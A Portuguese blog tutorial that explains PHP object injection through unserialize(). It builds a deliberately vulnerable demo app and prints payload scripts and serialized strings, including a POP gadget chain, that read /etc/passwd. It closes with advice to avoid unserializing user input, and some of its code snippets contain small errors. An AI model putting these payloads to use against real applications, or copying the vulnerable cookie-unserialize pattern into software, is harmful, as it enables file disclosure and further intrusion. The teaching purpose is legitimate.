---
title: Serialization e Object injection vulnerability - Uma década de exploração
date: 2020-08-01 01:02:17
tags: 
- security 
- php 
- object injection 
- owasp phpggc
- phpggc
---

TL;DR

> Esse artigo introduz e explora brevemente a vulnerabilidade object injection, especificamente na linguagem PHP, através de algumas técnicas conhecidas, mostrando como a simples utilização de uma função pode se tornar o pesadelo de uma aplicação inteira

### Agenda

- Serialization?
	- Serializando
	- Onde mora o perigo?
- O que é PHP Object Injection
- Exploração
	- Preparação
	- Condições necessárias
	- Ataque direto
	- Gadget chains/POP - Property Oriented Programming
- Onde estamos errando?
- Créditos e referência

## Serialization?

A prática/funcionalidade de serialização de dados utilizada em linguagens de programação (Java, php, python, etc) permite que um objeto seja representado em um valor que possa ser armazenado/transferido via rede (Texto). Já o ato de deserializar é oposto disso, trazemos essa representação em texto para a forma do dado original (array, objeto, etc). É possível ver a utiliazação em vários pontos de aplicações: Armazenamento/manipulação de cookies de usuários, adicionar vida longa ao estado de sessões, estratégias de caching entre outras coisas

<div style="text-align:center"><img src="/images/architecture-768432_640.jpg" /></div>

### Serializando

Para armazenar ou transferir um objeto pela rede utilizamos a função [serialize][serialize-function]

```php
<?php

class User {
    public $name;
	public $isAdmin;
}

$user = new User();
$user->name = 'Rodrigo';
$user->isAdmin = false;

echo serialize($user);
```

Output:
```
O:4:"User":2:{s:4:"name";s:7:"Rodrigo";s:7:"isAdmin";b:0;}
```

Dessa forma podemos armazenar ou transferir essa string gerada.

Vamos quebrar em partes e entender o que significa cada trecho:

```
As letras e o que cada uma representa

b: Boleano;
i: Inteiro;
d: Float;
a: Array;
O: Objeto (TAMANHO_DO_NAME:"NOME_DA_CLASSE:NUM_DE_PROPRIEDADES:{PROPRIEDADES})
```

Logo é simples entender o que nosso output significa:

```
O:4:"User":2:{s:4:"name";s:7:"Rodrigo";s:7:"isAdmin";b:0;}

1 - Um objeto (O) de quatro letras (User) com duas propriedades (O:4:"User":2)
2 - As duas propriedades (name com tamanho de 4) e (isAdmin com tamanho de 7), o valor de name é uma string (s) de tamanho 7 e is admin é um boleano (b) igual a 0 (false)
```

E para deserializar também é muito simples:

```php
<?php

class User {
    public $name;
    public $isAdmin;
}

$user = new User();
$user->name = 'Rodrigo';
$user->isAdmin = false;

$serializedValue = serialize($user);
$unserializedValue = unserialize($serializedValue);

var_dump($unserializedValue);
```

output:

```
O:4:"User":2:{s:4:"name";s:7:"Rodrigo";s:7:"isAdmin";b:0;}object(User)#3 (2) {
  ["name"]=>
  string(7) "Rodrigo"
  ["isAdmin"]=>
  bool(false)
}
```

### Onde mora o perigo?

O input do usuário!

Assim como em outras operações no PHP, quando utilizamos a função [unserialize][unserialize-function] alguns métodos mágicos são invocados ([__wakeup][wakeup-method], [__destruct][destruct-method], [__toString][tostring-method]). Quando o fluxo dessa execução pode ter algum input de usuário, dependendo do contexto é possível abusar desses métodos de várias formas, que é onde entra a injeção de objetos. Iremos ver um pouco como isso é possível a seguir


## O que é PHP Object Injection?

Descrição traduzida segundo à [Owasp][owasp]

> PHP Object Injection é uma vulnerabilidade no nível de aplicação que pode permitir que um invasor execute diferentes tipos de ataques maliciosos, como "Code injection", "Sql injection", "Path traversal" e "Application Denial of service", dependendo do contexto. A vulnerabilidade ocorre quando a entrada fornecida pelo usuário não é higienizada adequadamente antes de ser passada para a função PHP [unserialize()](https://www.php.net/manual/en/function.unserialize.php). Como o PHP permite a serialização de objetos, os invasores podem transmitir seqüências serializadas ad-hoc a uma chamada unserialize() vulnerável, resultando em uma injeção arbitrária de objetos PHP no escopo da aplicação

## Exploração



### Preparação

Para exemplificar o ataque, criaremos um projeto simples com alguns cenários:

#### Criando a aplicação:

```
$ mkdir projeto-serialization; cd $_
$ composer init
...
```

Adicionamos um autoload simples:

```json
{
    // composer.json content...
    "autoload": {
        "psr-4": {
            "App\\": "src/"
        }
    }
}
```
Em seguida adicionaremos itens a mais conforme necessidade :)

### Condições necessárias

A vulnerabilidade pode ser explorada com algumas condições:

- A aplicação deve possuir classes que possuem os métodos vetores necessários: ([__wakeup][wakeup-method], [__destruct][destruct-method], [__toString][tostring-method]) que podem ser utilizados para injeção de comandos diretos ou até mesmo através da técnica de POP chain

- Todas as classes durante o ataque devem estar declaradas quando o `unserialize` vulnerável for chamado, caso contrário o autoloading de classes deve ser suportado para que a classe seja instanciada de forma dinâmica.

Então vamos começar por um cenário onde uma possível exploração pode ser feita...
Imagine uma seguinte classe que recebe o input do usuário com as informações de tema preferido, ordem de colunas de uma tabela específica, etc. A classe serializa esses dados e armazena:

```php
<?php

class User extends Controller {
    public function savePreferences()
    {
        // op, op, op
        $userInput = $request->data();
        $preference = serialize($userInput);
        // ... Logic to save to db, cookies, etc
	}
}
```

Agora essas informações dos cookies serão reutilizadas em algum momento (Aqui estamos citando os cookies como ponto de partida mas lembre-se que um dado serializado pode ter um ponto de entrada em qualquer lugar da aplicação e esse dado serializado pode conter input de usuário).

```php
class SomeOtherPage extends Controller {
	public function index()
	{
		if (isset($_COOKIE['extra_theme'])) {
			$preferences = unserialize($_COOKIE['extra_theme']);
			// ... op, op, op
		}
	}

	// OR

	public function settings()
	{
		$user = User::getUserFromDb('foo');
		$preferences = unserialize($user->getUserPreferences());
		// op, op, op
	}
}
```

O que acontece agora? Caso a string esteja higienizada/sanitizada, etc, tudo ocorrerá bem. Afinal de contas nossa classe que pega dados serializados que possui input de usuário trata campo por campo, faz validações pesadas, se certifica que tudo que estava ali era permitido, certo ( ͡° ͜ʖ ͡°)? Lembrando sempre que o perigo está no que o usuário nos manda. Nas preferências que foram salvas anteriormente, um atacante/usuário malicioso tem a oportunidade de fazer isso.

Em um cenário OK, teremos as informações processadas e passadas para os lugares necessários, seja para o front de uma aplicação, um email marketing de acordo com as preferências ou algo nesse sentido.

Agora em um cenário onde um atacante está explorando a aplicação, procurando vetores de entrada, vejamos as variáveis. Voltemos à primeira condição necessária:

> - A aplicação deve possuir classes que possuem os métodos vetores necessários: ([__wakeup][wakeup-method], [__destruct][destruct-method], [__toString][tostring-method]) que podem ser utilizados para injeção de comandos diretos ou até mesmo através da técnica de POP chain_

Para quem está sendo introduzido à vulnerabilidade agora, deve ter notado que a operação que fizemos anteriormente, manipulando um cookie ou carregando preferências de usuário não nos traz visibilidade alguma sobre classes que possuem os métodos mencionados na condição acima e é ai que entra o grande pulo do gato. Continuando:

> - Todas as classes durante o ataque devem estar declaradas quando o `unserialize` vulnerável for chamado, caso contrário o autoloading de classes deve ser suportado para que a classe seja instanciada de forma dinâmica

A segunda condição nos remete à um cenário muito comum hoje em aplicações de média/grande escala, até mesmo de pequeno porte. Quem programa sabe o quão é comum a utilização de autoloading dinâmico (_principalmente em frameworks_) nas aplicações de hoje, seja via composer (Nosso projeto que criamos no começo do artigo...) ou até mesmo um autoload personalizado. De fato essas aplicações possuem na maioria dos casos bibliotecas comuns instaladas, seja para gerenciamento de logs (Monolog), clients http (Guzzle) e outras.

Tendo esse fato em mãos, atacantes abusam disso para que através de outras bibliotecas seja possível executar os mais diversos tipos de ataques, que como dito acima podem ser desde um "simples" denial of service ou até mesmo um RCE comprometendo de forma rigorosa a aplicação/infraestrutura.

### Ataque direto

Vamos à um ataque onde uma classe está muito vulnerável, de vetor simples. Como dito anteriormente nosso cookie é salvo da seguinte forma:

```php
class User extends Controller {
    public function savePreferences()
    {
        // op, op, op, save data etc
        $extraThemes = serialize($_POST['extra_themes']);
		setcookie('extra_themes', $extraThemes);
	}
}
```

Criei um arquivo php simples que irá trabalhar com esse dado posteriormente:

<div style="text-align:center"><img src="/images/index1.png" /></div>

Basicamente um form onde os dados são enviados para o backend.

Dentro do projeto que criamos, esse arquivo possui a seguinte estrutura:

```php
<?php 

require_once __DIR__ . '/vendor/autoload.php'; // IMPORTANTE / Condição 2
session_start(); 

?>

...
        <h2>Preferences Form</h2>
        <form action="save.php" method="POST">
            <p>
                Name:
                <input name="name"/>
            </p>
            <p>
            Theme 1
            <input name="theme[]"/>
            Theme 2
            <input name="theme[]"/>
            Extra theme (use ',' to separate multiples)
            <input name="extra_themes"/>
            </p>
            <input type="submit" value="Send"/>
        </form>

        <div>
            <p>
                Name:
                <?= isset($_SESSION['name']) ? $_SESSION['name'] : 'Not defined' ?>
            </p>
            <p>
                Theme:
                <?= isset($_SESSION['theme']) ? implode(', ', $_SESSION['theme']) : 'Not defined' ?>

                <?= isset($_COOKIE['extra_themes']) ? '<p>Extra themes: ' . unserialize($_COOKIE['extra_themes']) . '</p>' : '' ?>
            </p>            
        </div>
```

Aqui nosso cookie `extra_themes` é deserializado de forma nuca e crua:

```php
<?= isset($_COOKIE['extra_themes']) ? '<p>Extra themes: ' . unserialize($_COOKIE['extra_themes']) . '</p>' : '' ?>
```


 Então procuramos no sistema algumas classes que fazem sentido e achamos a seguinte classe:

```php
class FileReader {
	protected $fileName;

	public function __toString()
	{
		if (!file_exists($this->filename)) {
			return "File don't exists";
		}

		return file_get_contents($this->filename);
	}
}
```

A classe basicamente le o conteúdo do arquivo presente na propriedade `$this->filename`.

Tendo conhecimento da classe acima, poderiamos criar um simples script dentro do projeto para passar valores arbitrários que serão lidos durante o ato de deserialization:

```php
require_once . '/vendor/autoload.php';

$obj = new App/FileReader();
$obj->filename = '/etc/passwd';
echo serialize($obj);
```

O que resulta na seguinte string:


```
O:14:"App\FileReader":2:{s:11:"*fileName";N;s:8:"filename";s:11:"/etc/passwd";}
```

Existe um ponto onde na representação dessa string teriamos nullbytes, então um payload ainda mais funcional para ser enviado em uma requisição seria:

```php
<?php

$obj = new App\FileReader();
$obj->filename = '../passwd';
$serialized = serialize($obj);

$keys = str_split("%\x00\n\r\t+;");
$values = array_map('urlencode', $keys);
$serialized = str_replace($keys, $values, $serialized);
echo $serialized;
```

Dessa forma previnimos que nossa string entre quebrada na requisição:

```
O:14:"App\FileReader":2:{s:11:"%00*%00fileName"%3BN%3Bs:8:"filename"%3Bs:9:"../passwd"%3B}
```

Ok! Payload preparado.

Voltando a nossa aplicação, vamos lembrar que ela:

- Recebe os cookies
- Salva
- Reutiliza na index caso o mesmo esteja setado, dando um `echo` diretamente na string serializada:

Em um cenário de não ataque temos o seguinte conteudo nos cookies:

<div style="text-align:center"><img src="/images/cookie1.png" /></div>

Agora como atacantes enviaremos o payload com conteúdo arbitrário:

<div style="text-align:center"><img src="/images/cookie2.png" /></div>

Atualizamos a página e....

<div style="text-align:center"><img src="/images/index2.png" /></div>

Booom! **Pwned**. Conseguimos escalar um ataque de [local-file-inclusion][LFD] injetando um objeto nos cookies que como é deserializado e "printado" na página, faz com que o método `__toString` seja executado, com a propriedade alterada e com um valor arbitrário -> `/etc/passwd`. Nesse caso utilizamos como vetor uma classe vetor que utiliza `__toString` mas poderiamos usar classes do sistema/vendor que utilizam `__destruct` ou  `__wakeup` facilmente. O grande trabalho é apenas encontrar classes que nos deem esse tipo de entrada.

### Gadget chains/POP - Property Oriented Programming

Uma outra técnica que é utilizada em muitos ataques que ainda ocorrem hoje em dia mesmo após a primeira citação/paper (_Utilizing Code Reuse/ROP in PHP Application Exploits_) dez anos atrás e que é muito poderosa e traz consigo algum trabalho de pesquisa. Basicamente é o cenário mostrado anteriormente com steroids!

<div style="text-align:center"><img src="/images/paper_pop.png" /></div>

que é muito parecida com o cenário anterior mas que tem uma particularidade.
Através da técnica de Property Oriented Programming fazemos o reuso de classes para que através de propriedades de classes seja possível um ataque como o anterior, nós literalmente pulamos de classe em classe e formamos um caminho válido até o pote de ouro :).

Podemos imaginar um cenário onde ainda temos nossa classe de `FileReader` mas que ela só possui o vetor `__toString`, e temos  em algum momento uma chamada de unserialize em nossos cookies, então um atacante pode se aproveitar de uma outra classe no sistema:

```php
<?php

class UserTheme {
    protected $extraThemes;
    
    public function extraThemes() {
        return 'User extra themes: ' . $this->extraThemes;
    }
}
```

A classe basicamente faz uso da propriedade `$this->extraThemes`.

Para criar o seguinte payload:

```php
<?php

namespace App {
    class FileReader {
        public function __construct()
        {
            $this->fileName = '/etc/passwd';
        }
    }

    class UserTheme {
        public function __construct()
        {
            $this->extraThemes = New FileReader();
        }
     }
}
```

Nós utilizamos a propriedade da classe `UserTheme` como caminho para a classe `FileReader` (Pop chain).
Agora basta serializar:

```php
obj = new App\UserTheme();
$serialized = serialize($obj);

$keys = str_split("%\x00\n\r\t+;");
$values = array_map('urlencode', $keys);
$serialized = str_replace($keys, $values, $serialized);
echo $serialized;
```

Que resulta em:

```
O:13:"App\UserTheme":1:{s:11:"extraThemes";O:14:"App\FileReader":1:{s:8:"fileName";s:11:"/etc/passwd";}}
```

Então conseguimos executar o código que está dentro de `App\UserTheme::__toString`:

```php
class FileReader {
	protected $fileName;

	public function __toString()
	{
		if (!file_exists($this->filename)) {
			return "File don't exists";
		}

		return file_get_contents($this->filename);
	}
}
```

A utilização da propridade `$this->extraThemes` com um valor arbitrário dentro da classe `UserThemes` nos permite "triggar" a vulnerabilidade

<div style="text-align:center"><img src="/images/mindblow.gif" /></div>

Então essa vulnerabilidade não se limita apenas ao contexto da aplicação, pelo contrário... é possível abusar de bibliotecas instaladas para que outros tipos de ataques sejam alcançados.
E pensando nisso foi criado a ferramenta ([phpggc][phpggc] que é especializada nesse tipo de payload utilizando pop, que possui diversas bibliotecas/frameworks de mercado mapeadas. É possível obter diversos payloads com estratégias diversas de encoding/bypass via linha de comando (no qual já contribui :))
A ferramenta hoje possui uma vasta quantidade de bibliotecas já mapeadas:

<div style="text-align:center"><img src="/images/phpggc.png" /></div>

## Onde estamos errando?
<div style="text-align:center"><img src="/images/message-unserialize.png" /></div>

Essa mensagem quando entramos na documentação da função unserialize nos deixa bem claro que **NUNCA** devemos confiar no input do usuário. Caso seja possível, sempre utilize `json_encode` e funções relacionadas para trabalhar com estado de dados.

Unserialize pode ser muito perigoso!



## Créditos e referência

- [Serialize function][serialize-function]
- [Owasp | PHP Object Injection][owasp-poo]
- [ Code Reuse Attacks in PHP: Automated POP Chain Generation ][code-reuse-paper]





[serialize-function]: https://www.php.net/manual/en/function.serialize.php
[unserialize-function]: https://www.php.net/manual/en/function.unserialize.php
[wakeup-method]: https://www.php.net/manual/pt_BR/language.oop5.magic.php#object.wakeup
[destruct-method]: https://www.php.net/manual/pt_BR/language.oop5.decon.php#object.destruct
[owasp]: https://owasp.org
[tostring-method]: https://www.php.net/manual/pt_BR/language.oop5.magic.php#object.tostring
[local-file-inclusion]:  https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
[phpggc]:  https://github.com/ambionics/phpggc
[owasp-poo]:  https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection
[code-reuse-paper]:  https://www.ei.ruhr-uni-bochum.de/media/emma/veroeffentlichungen/2014/09/10/POPChainGeneration-CCS14.pdf
